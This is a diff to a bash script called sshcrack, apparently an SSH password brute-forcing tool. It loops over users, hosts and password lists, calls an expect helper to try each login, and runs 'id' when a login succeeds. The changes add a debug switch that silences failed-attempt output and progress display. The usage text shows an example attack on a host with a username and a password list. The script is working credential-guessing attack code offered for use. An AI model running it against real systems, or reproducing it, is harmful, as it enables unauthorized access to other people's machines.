@@ -11,6 +11,7 @@ declare passwd_list_num=0
 declare sshcrack_logfile="sshcrack.log"
 declare sshcrack_timeout=10
 declare sshcrack_threadnum=1
+declare sshcrack_debug=0
 
 declare sshcrack_flag=0
 declare sshcrack_job=0
@@ -189,37 +190,34 @@ function sshcrack_init()
 		
 }
 
+#function sshcrack_display_progress()
+#{
+#        local run_time x y
+#
+#	sshcrack_run_play
+#
+#        get_run_time $sshcrack_pid
+#        run_time=$?
+#
+#        compute_run_time $run_time
+#
+#	x=$((sshcrack_threadnum+6)); y=$((max_col_num+4))
+#	[ $x -gt $max_row_num ] && x=$max_row_num
+#
+#	printf "\033[${x}:${y}H\033[32;1m[%5d/%-5d]\t%s\033[0m" $sshcrack_curr_job $sshcrack_job "$total_run_time"
+#}
+
 function sshcrack_display_progress()
 {
-        local run_time x y
+        local x y
 
 	sshcrack_run_play
-
-        get_run_time $sshcrack_pid
-        run_time=$?
-
-        compute_run_time $run_time
 
 	x=$((sshcrack_threadnum+6)); y=$((max_col_num+4))
 	[ $x -gt $max_row_num ] && x=$max_row_num
 
-	printf "\033[${x}:${y}H\033[32;1m[%5d/%-5d]\t%s\033[0m" $sshcrack_curr_job $sshcrack_job "$total_run_time"
+	printf "\033[${x}:${y}H\033[32;1m[%5d/%-5d]\033[0m" $sshcrack_curr_job $sshcrack_job
 }
-
-#function do_sshcrack()
-#{
-#	local ret x=$(($1+4)) y=1
-#
-#	./sshcrack.exp $3 $2 $4 $5 $6 >/dev/null
-#	ret=$?
-#	if [ $ret -eq 6 ];then 
-#		printf "\033[${x}:${y}H\033[32;1mThread[%2d]\t%s@%s\t\t==>\t[%-16s]\t[success]\t%2d\n\033[0m" $1 $2 $3 $4 $ret
-#		return 0
-#	else
-#		printf "\033[${x}:${y}H\033[32;1mThread[%2d]\t%s@%s\t\t==>\t[%-16s]\t[failed]\t%2d\n\033[0m" $1 $2 $3 $4 $ret
-#	fi
-#	return 1
-#}
 
 function do_sshcrack()
 {
@@ -232,7 +230,9 @@ function do_sshcrack()
 		kill -s SIGUSR2 $sshcrack_pid
                 return 0
         else
-                printf "\033[${x}:${y}H\033[32;1mThread[%2d]\t%s@%s\t\t==>\t[%-16s]\t[failed]\t%2d\n\033[0m" $1 $2 $3 $4 $ret
+		if [ $sshcrack_debug -eq 1 ]; then
+                	printf "\033[${x}:${y}H\033[32;1mThread[%2d]\t%s@%s\t\t==>\t[%-16s]\t[failed]\t%2d\n\033[0m" $1 $2 $3 $4 $ret
+		fi
         fi
         return 1
 }
@@ -248,16 +248,15 @@ function sshcrack_engine()
 			for passwd in ${passwd_list[*]}
 			do
 				if [ $sshcrack_flag -eq 1 ]; then
-					#echo "waiting thread to finsh..."
 					wait 
-					sshcrack_display_progress
+					[ $sshcrack_debug -eq 1 ] && sshcrack_display_progress
 					return 0
 				fi
 				if [ $thread_num -ge $sshcrack_threadnum ]; then
 					wait; thread_num=0; 
 					do_sshcrack $thread_num $user $host $passwd "id" $sshcrack_timeout
 					((sshcrack_curr_job++))
-					sshcrack_display_progress
+					[ $sshcrack_debug -eq 1 ] && sshcrack_display_progress
 					continue
 				fi
 				((sshcrack_curr_job++))
@@ -265,7 +264,7 @@ function sshcrack_engine()
 				{
 				do_sshcrack $thread_num $user $host $passwd "id" $sshcrack_timeout
 				}&
-				sshcrack_display_progress
+				[ $sshcrack_debug -eq 1 ] && sshcrack_display_progress
 			done
 		done
 	done
@@ -292,7 +291,8 @@ function sshcrack_usage()
 	echo -e "-p\t\tsingle passwd or passwd list file."
 	echo -e "-t\t\tconnect timeout, defalut is 5s."
 	echo -e "-n\t\tthread num, default is 1."
-	echo -e "-o\t\tlog file.\n"
+	echo -e "-o\t\tlog file."
+	echo -e "-d\t\tdebug mode."
 	echo -e "-v\t\tdisplay help information.\n"
 	echo -e "exp:\n"
 	echo -e "$1 -h 192.168.215.148 -u wzt -p passwd.lst"
@@ -308,7 +308,7 @@ function main()
 		exit 0
 	fi
 
-        while getopts "h:u:p:n:t:o:v" arg
+        while getopts "h:u:p:n:t:o:d:v" arg
         do
         	case $arg in
                 	h)
@@ -323,6 +323,8 @@ function main()
                         	sshcrack_timeout=$OPTARG ;;
                 	n)
                         	sshcrack_threadnum=$OPTARG ;;
+			d)
+				sshcrack_debug=$OPTARG ;;
                 	v)
                         	sshcrack_usage $0
                         	exit 0
@@ -341,7 +343,6 @@ function main()
 	sshcrack_engine
 	wait
 	sshcrack_console_exit
-	#echo $sshcrack_curr_job
 }
 
 main $@
